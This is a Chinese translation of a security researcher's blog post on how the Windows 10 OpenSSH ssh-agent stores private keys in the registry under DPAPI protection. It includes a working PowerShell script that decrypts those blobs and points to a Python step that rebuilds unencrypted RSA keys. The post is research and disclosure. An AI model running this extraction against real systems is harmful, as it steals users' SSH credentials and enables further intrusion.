## 背景

 **在这个周末我安装了Windows 10 Spring
Update，最令我期待的就是它的内置[OpenSSH工具](https://www.zdnet.com/article/openssh-arrives-in-windows-10-spring-update/)，这意味着Windows管理员不再需要使用Putty和PPK格式的密钥了。随后，我花了些时间来探索并了解该版本所支持的特性。最终没有令我失望，我惊喜地看到ssh-agent.exe也被包含在内。在[MSDN的一篇关于使用新Windows ssh-agent文章](https://blogs.msdn.microsoft.com/powershell/2017/12/15/using-the-openssh-beta-in-windows-10-fall-creators-update-and-windows-server-1709/)的以下部分，引起了我的注意：**

 **![1ssh-agent-msdn.png](https://image.3001.net/images/20180523/15270343123966.png!small)**

过去我曾有过劫持ssh-agent.的相关经验，并尝试过一些有趣的测试，所以我决定开始查看Windows是如何“安全地”用这个新的服务来存储您的私钥的。我将在这篇文章中概述我的方法和步骤，这是一个非常有趣的过程。好了，话不多说让我们开始我们的旅程吧！

私钥由DPAPI保护并存储在HKCU注册表hive中。我在[这里](https://github.com/ropnop/windows_sshagent_extract)发布了一些PoC代码，从注册表中提取并重构RSA私钥。

## 在Windows 10中使用OpenSSH

测试要做的第一件事就是使用OpenSSH生成几个密钥对并将它们添加到ssh-agent中。

首先，我使用ssh-keygen.exe生成了一些受密码保护的测试密钥对：

![2powershell_genkey.png](https://image.3001.net/images/20180523/15270343308275.png!small)

然后确保新的ssh-agent服务正在运行，并使用ssh-add将私钥对添加到正在运行的agent中：

![3ssh-add_powershell.png](https://image.3001.net/images/20180523/15270343467751.png!small)

运行ssh-add.exe -L显示当前由SSH agent管理的密钥。

最后，在将公钥添加到Ubuntu box之后，我验证了我可以从Windows 10进入SSH，而不需要解密我的私钥（因为ssh-agent正在为我处理）：

![4ssh-ubuntu.png](https://image.3001.net/images/20180523/15270343629786.png!small)

## 监控SSH Agent

为了了解SSH代理是如何存储和读取我的私钥，我开始静态检查ssh-agent.exe。然而，我的静态分析技能很弱，所以我放弃了，并最终决定采用动态跟踪这个过程的方式，看看它在做什么。

我使用了[Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)的procmon.exe，并为包含“ssh”的任意进程名称添加了一个过滤器。

随着procmon捕获事件，我再次进入我的Ubuntu机器。查看所有的事件，我看到ssh.exe打开了一个TCP连接到Ubuntu，以及ssh-agent.exe进入并从Registry中读取了一些值：

![5ssh-agent_procmon-1.png](https://image.3001.net/images/20180523/15270343837596.png!small)

这里有两个非常重要的点：

> 进程ssh-agent.exe读取来自HKCU\Software\OpenSSH\Agent\Keys的键值
>
> 读取这些值后，立即打开了dpapi.dll。

正因为如此，我现在知道某种受保护的数据被存储在注册表中并从注册表中被读取，ssh-agent正在使用微软的[数据保护API](https://msdn.microsoft.com/en-us/library/windows/desktop/hh706794\(v=vs.85\).aspx)。

## 测试注册表值

果然，在注册表中，可以看到我使用ssh-add添加的两个键项。密钥名称是公开密钥的指纹，并且存在一些二进制blobs：

![6regedit_openssh_agent.png](https://image.3001.net/images/20180523/15270344043345.png!small)

![regedit_key_binary.png](https://image.3001.net/images/20180523/15270344415404.png!small)

我能够pull注册表值并操作它们。“注释”字段只是ASCII编码文本，是我添加的密钥的名称：

![7key_comment.png](https://image.3001.net/images/20180523/15270344598151.png!small)

（默认值）只是一个字节数组，没有解码出任何有意义的东西。我有一个预感，这是“加密”私钥，那么我是否能pull并解密它呢。我把字节pull到了一个Powershell变量：

![8keybytes_powershell.png](https://image.3001.net/images/20180523/15270344732003.png!small)

## 解除密钥保护

虽然我知道很多后利用工具可以滥用它来取出凭据，但我对DPAPI并不太熟悉，因此我也知道其他人可能已经实现了一个wrapper。通过Google搜索，我找到了一个简单的单线程wrapper。

我仍然不知道这是否可行，但我试图使用DPAPI去解除字节数组的保护。Base64编码结果如下：

    
    
    Add-Type -AssemblyName System.Security  
    $unprotectedbytes = [Security.Cryptography.ProtectedData]::Unprotect($keybytes, $null, 'CurrentUser')
    
    [System.Convert]::ToBase64String($unprotectedbytes)

返回的Base64看起来不像是私钥，但我只是为了好玩而解码它，然而对于里面出现的“ssh-rsa”字符串我感到非常的惊喜。

![9base64_decode_openssh-1.png](https://image.3001.net/images/20180523/15270345026886.png!small)

## 找出二进制格式

这部分是我花时间最长的一部分。我知道我有某种键的二进制表示，但我无法找出格式或如何使用它。

我用openssl，puttygen和ssh-keygen来生成各种RSA密钥，但从来没有得到类似于我拥有的二进制文件的任何东西。

最后，在大量的Google之后，我从NetSPI找到了一篇关于从Linux上的ssh-agent的内存转储中取出OpenSSH私钥的文章：<https://blog.netspi.com/stealing-unencrypted-ssh-agent-keys-from-memory/>

难道是二进制格式相同吗？我从博客中获取了[Python脚本](https://github.com/NetSPI/sshkey-grab/blob/master/parse_mem.py)，并为它提供了我从Windows注册表中获得的不受保护的base64 blob：

![10parse_mem_python.png](https://image.3001.net/images/20180523/15270345301328.png!small)

可以正常工作了！我不知道原作者soleblaze是如何找出二进制数据的正确格式的，但在这里我要特别感谢他所做的以及他的分享！

在证明可以从注册表中提取私钥后，我将PoC分享到了GitHub。

## [GitHub Repo](https://github.com/ropnop/windows_sshagent_extract)

第一个是Powershell脚本（extract_ssh_keys.ps1），用于查询注册表中被ssh-agent保存的任何密钥。然后使用DPAPI与当前用户上下文来解除二进制保护，并将其保存在Base64中。由于我不知道如何在Powershell中解析二进制数据，所以我把所有的密钥保存到了一个JSON文件中，然后我可以在Python中导入。Powershell脚本只有几行：

    
    
    $path = "HKCU:\Software\OpenSSH\Agent\Keys\"
    
    $regkeys = Get-ChildItem $path | Get-ItemProperty
    
    if ($regkeys.Length -eq 0) {  
        Write-Host "No keys in registry"
        exit
    }
    
    $keys = @()
    
    Add-Type -AssemblyName System.Security;
    
    $regkeys | ForEach-Object {
        $key = @{}
        $comment = [System.Text.Encoding]::ASCII.GetString($_.comment)
        Write-Host "Pulling key: " $comment
        $encdata = $_.'(default)'
        $decdata = [Security.Cryptography.ProtectedData]::Unprotect($encdata, $null, 'CurrentUser')
        $b64key = [System.Convert]::ToBase64String($decdata)
        $key[$comment] = $b64key
        $keys += $key
    }
    
    ConvertTo-Json -InputObject $keys | Out-File -FilePath './extracted_keyblobs.json' -Encoding ascii  
    Write-Host "extracted_keyblobs.json written. Use Python script to reconstruct private keys: python extractPrivateKeys.py extracted_keyblobs.json"  

我大量借用了parse_mem_python.py中的代码，并将其更新为Python
3，用于下一个脚本：extractPrivateKeys.py。从Powershell脚本生成的JSON将输出所有的RSA私钥：

![11private_keys_powershell.png](https://image.3001.net/images/20180523/15270345575205.png!small)

这些RSA私钥是未加密的。虽然我创建它们时，添加了一个密码，但它们使用ssh-agent未加密存储，所以我不再需要密码。

为了验证，我将密钥复制回了Kali linux
box中验证了指纹，并将其应用到了SSH中！![12ssh_kali.png](https://image.3001.net/images/20180523/15270345833134.png!small)

## 结语

很显然，我的PowerShell功底非常的薄弱，我发布的代码更多的是PoC。我也希望我的PoC最终能被武器化，并被添加到后利用的框架中。希望大家也能积极地探索，如果你也有新的发现和玩法，那么欢迎你在第一时间与我分享！

 ***参考来源：[ropnop](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)，FB小编 secist 编译，转载请注明来自FreeBuf.COM**  

